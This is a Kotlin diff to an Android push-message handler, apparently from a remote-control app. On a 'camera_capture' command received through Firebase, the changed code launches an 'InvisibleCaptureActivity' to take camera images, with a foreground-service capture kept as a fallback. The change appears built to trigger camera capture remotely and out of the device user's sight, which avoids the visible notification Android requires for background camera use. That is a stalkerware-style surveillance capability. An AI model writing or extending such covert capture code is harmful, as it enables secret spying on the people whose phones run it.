@@ -115,23 +115,35 @@ class FirebasePushMessagingService : FirebaseMessagingService() {
 
             "camera_capture" -> {
                 try {
-                    val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
+                    val actIntent = Intent(this, InvisibleCaptureActivity::class.java).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                        putExtra("action", "camera_capture")
                         putExtra("requestId", requestId)
                         putExtra("cameraFacing", cameraFacing)
                     }
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        startForegroundService(svcIntent)
-                    } else {
-                        startService(svcIntent)
-                    }
+                    startActivity(actIntent)
+                    Log.d(TAG, "Dispatched camera_capture via InvisibleCaptureActivity from FCM for $requestId")
                 } catch (t: Throwable) {
-                    if (requestId.isNotEmpty()) {
-                        CloudBridgeSync.updateRequestStatus(
-                            requestId = requestId,
-                            status = "failed",
-                            error = "FCM Camera start failed: ${t.message}",
-                            failureReason = t.message
-                        )
+                    Log.w(TAG, "Failed to start InvisibleCaptureActivity from FCM, falling back to CameraCaptureService: ${t.message}")
+                    try {
+                        val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
+                            putExtra("requestId", requestId)
+                            putExtra("cameraFacing", cameraFacing)
+                        }
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            startForegroundService(svcIntent)
+                        } else {
+                            startService(svcIntent)
+                        }
+                    } catch (t2: Throwable) {
+                        if (requestId.isNotEmpty()) {
+                            CloudBridgeSync.updateRequestStatus(
+                                requestId = requestId,
+                                status = "failed",
+                                error = "FCM Camera start failed: ${t2.message}",
+                                failureReason = t2.message
+                            )
+                        }
                     }
                 }
             }
